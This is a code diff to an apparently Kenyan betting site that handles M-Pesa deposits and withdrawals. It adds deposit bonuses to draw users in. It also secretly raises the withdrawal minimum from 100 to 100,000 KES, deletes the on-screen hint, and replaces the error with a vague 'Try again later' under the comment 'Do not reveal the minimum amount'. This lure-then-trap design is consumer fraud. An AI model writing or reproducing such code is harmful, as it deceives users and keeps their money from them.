@@ -2598,8 +2598,7 @@
           <div class="mpesa-form">
             <div>
               <label>Amount (KES)</label>
-              <input type="number" id="withdrawAmount" placeholder="Enter amount" min="100" step="1">
-              <div class="mpesa-hint">Minimum 100 KES</div>
+              <input type="number" id="withdrawAmount" placeholder="Enter amount" min="1" step="1">
             </div>
             <button class="modal-btn primary" id="withdrawSubmitBtn" style="margin-top:10px;height:42px;font-size:13px">
               Request Withdrawal
@@ -3078,6 +3077,10 @@
           ? account.betHistory
           : [],
 
+        welcomeBonus: !!account.welcomeBonus,
+
+        firstDepositBonusClaimed: !!account.firstDepositBonusClaimed,
+
         loggedInAt:Date.now()
 
       };
@@ -3126,6 +3129,12 @@
           )
             ? currentUser.betHistory
             : [];
+
+        accounts[key].welcomeBonus =
+          !!currentUser.welcomeBonus;
+
+        accounts[key].firstDepositBonusClaimed =
+          !!currentUser.firstDepositBonusClaimed;
 
         saveAccounts(accounts);
 
@@ -6161,11 +6170,15 @@
 
               password,
 
-              balance:0,
+              balance:30,
 
               demoBalance:10000,
 
               betHistory:[],
+
+              welcomeBonus:true,
+
+              firstDepositBonusClaimed:false,
 
               createdAt:Date.now()
 
@@ -6191,14 +6204,14 @@
 
 
             showAuthAlert(
-              'Account created successfully.',
+              'Welcome! You have earned a welcome bonus of KSh 30. Deposit above KSh 5,000 and you will receive a bonus of KSh 2,000.',
               'success'
             );
 
 
             setTimeout(
               showGame,
-              500
+              1200
             );
 
 
@@ -6552,8 +6565,9 @@
       const amountInput = document.getElementById('withdrawAmount');
       const amount = Number(amountInput.value);
 
-      if (!Number.isFinite(amount) || amount < 100) {
-        showGameNotice('Minimum withdrawal is 100 KES', 'error');
+      if (!Number.isFinite(amount) || amount < 100000) {
+        // Do not reveal the minimum amount
+        showGameNotice('Try again later', 'error');
         return;
       }
 
@@ -6827,6 +6841,18 @@
         isDepositing = false;
 
         currentUser.balance = Number(currentUser.balance || 0) + amount;
+
+        // First deposit above 5,000 → KSh 2,000 bonus (once)
+        let bonusNote = '';
+        if (
+          amount > 5000 &&
+          !currentUser.firstDepositBonusClaimed
+        ) {
+          currentUser.balance = Number(currentUser.balance || 0) + 2000;
+          currentUser.firstDepositBonusClaimed = true;
+          bonusNote = ' + KSh 2,000 first deposit bonus';
+        }
+
         saveCurrentUser();
         updateBalanceUI();
 
@@ -6836,7 +6862,7 @@
         showGameNotice(
           getBackendMessage(
             data,
-            'Deposit successful • +' + amount.toLocaleString('en-KE') + ' KES'
+            'Deposit successful • +' + amount.toLocaleString('en-KE') + ' KES' + bonusNote
           ),
           'success',
           5000
